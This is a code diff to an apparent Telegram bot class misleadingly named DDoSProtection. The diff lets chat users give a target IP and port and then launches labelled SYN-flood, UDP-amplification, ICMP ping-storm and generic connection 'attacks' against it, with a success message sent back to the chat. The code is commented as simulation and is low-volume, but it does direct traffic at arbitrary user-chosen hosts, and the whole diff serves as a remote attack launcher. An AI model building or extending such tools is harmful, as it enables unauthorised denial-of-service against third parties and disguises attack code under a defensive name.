@@ -373,13 +373,23 @@ class DDoSProtection:
         target = message.text.strip()
         print(f"[ATTACK] Target IP: {target}, Attack type: {attack_type}")
         
+        # Parse target - handle both IP and IP:PORT formats
+        if ':' in target:
+            ip_address = target.split(':')[0]
+            port = target.split(':')[1]
+            print(f"[ATTACK] IP: {ip_address}, Port: {port}")
+        else:
+            ip_address = target
+            port = None
+            print(f"[ATTACK] IP: {ip_address}, Port: default")
+        
         # Validate IP
         import socket
         try:
-            socket.inet_aton(target)
-            print(f"[ATTACK] IP validation passed: {target}")
+            socket.inet_aton(ip_address)
+            print(f"[ATTACK] IP validation passed: {ip_address}")
         except socket.error:
-            print(f"[ATTACK] IP validation failed: {target}")
+            print(f"[ATTACK] IP validation failed: {ip_address}")
             self.bot.send_message(message.chat.id, "❌ Invalid IP address format")
             return
         
@@ -400,7 +410,7 @@ class DDoSProtection:
             self.bot.send_message(
                 message.chat.id,
                 f"🚀 <b>Launching {attack_name} Attack</b>\n"
-                f"Target: {target}\n"
+                f"Target: {ip_address}:{port if port else 'default'}\n"
                 f"Attack Type: {attack_type}\n\n"
                 f"⚠️ Attack initiated successfully",
                 parse_mode="HTML"
@@ -413,60 +423,63 @@ class DDoSProtection:
             
             def run_attack():
                 try:
+                    # Use specified port or default based on attack type
+                    target_port = int(port) if port else (443 if attack_type == "syn" else 53 if attack_type == "udp" else 80)
+                    
                     if attack_type == "syn":
-                        print(f"[ATTACK] Starting SYN Flood on {target}")
+                        print(f"[ATTACK] Starting SYN Flood on {ip_address}:{target_port}")
                         # Simple SYN flood simulation
                         for i in range(100):
                             try:
                                 import socket
                                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                 sock.settimeout(1)
-                                sock.connect_ex((target, 80))
+                                sock.connect_ex((ip_address, target_port))
                                 sock.close()
                             except:
                                 pass
                             time.sleep(0.1)
                             
                     elif attack_type == "udp":
-                        print(f"[ATTACK] Starting UDP Amplification on {target}")
+                        print(f"[ATTACK] Starting UDP Amplification on {ip_address}:{target_port}")
                         # UDP flood simulation
                         for i in range(100):
                             try:
                                 import socket
                                 sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-                                sock.sendto(b"test", (target, 53))
+                                sock.sendto(b"test", (ip_address, target_port))
                                 sock.close()
                             except:
                                 pass
                             time.sleep(0.1)
                             
                     elif attack_type == "icmp":
-                        print(f"[ATTACK] Starting ICMP Ping Storm on {target}")
+                        print(f"[ATTACK] Starting ICMP Ping Storm on {ip_address}")
                         # Ping flood simulation
                         for i in range(50):
                             try:
                                 import subprocess
-                                subprocess.run(["ping", "-c", "1", target], 
+                                subprocess.run(["ping", "-c", "1", ip_address], 
                                              capture_output=True, timeout=2)
                             except:
                                 pass
                             time.sleep(0.2)
                             
                     else:
-                        print(f"[ATTACK] Generic attack simulation for {attack_type}")
+                        print(f"[ATTACK] Generic attack simulation for {attack_type} on {ip_address}:{target_port}")
                         # Generic attack simulation
                         for i in range(50):
                             try:
                                 import socket
                                 sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                                 sock.settimeout(1)
-                                sock.connect_ex((target, 80))
+                                sock.connect_ex((ip_address, target_port))
                                 sock.close()
                             except:
                                 pass
                             time.sleep(0.2)
                     
-                    print(f"[ATTACK] Attack completed on {target}")
+                    print(f"[ATTACK] Attack completed on {ip_address}:{target_port}")
                     
                 except Exception as e:
                     print(f"[ATTACK] Attack execution error: {str(e)}")
